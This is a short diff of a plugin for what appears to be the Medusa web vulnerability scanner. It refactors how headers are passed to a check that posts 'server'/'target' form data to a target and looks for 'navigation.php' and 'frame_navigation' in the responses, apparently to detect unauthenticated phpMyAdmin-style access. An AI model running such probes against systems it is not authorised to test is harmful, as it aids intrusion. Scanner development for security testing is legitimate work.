@@ -33,7 +33,7 @@ post_data = {
     "server": "1",
     "target": "index.php"
 }
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
@@ -45,15 +45,13 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
         port = port
     try:
         payload_url = scheme+"://"+url+ ':' + str(port)+payload
-        headers = {
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': '*/*',
-            "Content-Type": "application/x-www-form-urlencoded",
-            'User-Agent': RandomAgent,
-        }
+
+        Headers['Accept']='*/*'
+        Headers["Content-Type"]="application/x-www-form-urlencoded"
+
         s = requests.session()
-        resp = s.post(payload_url, data=post_data,headers=headers,proxies=proxies, timeout=5, verify=False)
-        resp2 = s.get(payload_url, headers=headers, timeout=5, proxies=proxies,verify=False)
+        resp = s.post(payload_url, data=post_data,headers=Headers,proxies=proxies, timeout=5, verify=False)
+        resp2 = s.get(payload_url, headers=Headers, timeout=5, proxies=proxies,verify=False)
         con = resp.text
         con2 = resp2.text
         if con2.lower().find('navigation.php')!=-1 and con.lower().find('frame_navigation')!=-1:
